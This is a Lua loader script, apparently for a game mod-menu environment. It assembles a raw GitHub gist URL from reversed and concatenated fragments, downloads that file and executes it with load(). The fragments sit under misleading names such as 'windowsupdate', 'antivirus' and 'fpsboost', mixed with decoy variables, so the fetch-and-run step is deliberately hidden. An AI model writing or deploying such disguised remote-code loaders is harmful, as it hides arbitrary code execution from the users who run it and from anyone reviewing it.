local cachecleanup =
    "Main.lua"

local fpsboost =
    true

local localhost =
    string.reverse(
        "tsig//:sptth"
    )

local randomdelay =
    os.clock()

local memoryoptimizer =
    table.concat({

        ".github",
        "usercontent"

    })

local fakeurl =
    "https://google.com"

local uselessdata =
    "asdhjkasdhjk123123"

local telemetry =
    ".com/"

local microsoftedge =
    "dev-"

local fakeapi =
    "localhost:3000"

local jgjhgeuiohguyh124e =
    "kabir/"

local windowsupdate =
    string.reverse(
        "932e24cc4afde66c4cdedecb04fb7822"
    )

local notused =
    math.random(
        100,
        999
    )

local microsofttelemetry =
    "/raw/"

local antivirus =
    "nothing_here"

local function BuildUrl()

    local part1 =
        localhost

    local part2 =
        memoryoptimizer

    local part3 =
        telemetry

    local user =
        microsoftedge
        .. jgjhgeuiohguyh124e

    local gist =
        windowsupdate

    local raw =
        microsofttelemetry

    local file =
        cachecleanup

    return table.concat({

        part1,
        part2,
        part3,
        user,
        gist,
        raw,
        file

    })

end

local function HttpGet(url)

    local curl =
        Curl.Easy()

    curl:Setopt(
        eCurlOption.CURLOPT_URL,
        url
    )

    curl:Perform()

    local timeout =
        os.clock() + 5

    while not curl:GetFinished() do

        if os.clock() > timeout then
            return nil
        end

    end

    local code, response =
        curl:GetResponse()

    return response

end

local script =
    HttpGet(
        BuildUrl()
    )

if script then

    local func =
        load(script)

    if func then

        local ok, err =
            pcall(func)

        if not ok then

            GUI.AddToast(
                "",
                "Loader Error",
                5000
            )

            Logger.LogError(err)

        end

    else

        GUI.AddToast(
            "",
            "Failed To Load Script",
            5000
        )

    end

else

    GUI.AddToast(
        "",
        "Failed To Download Script",
        5000
    )

end
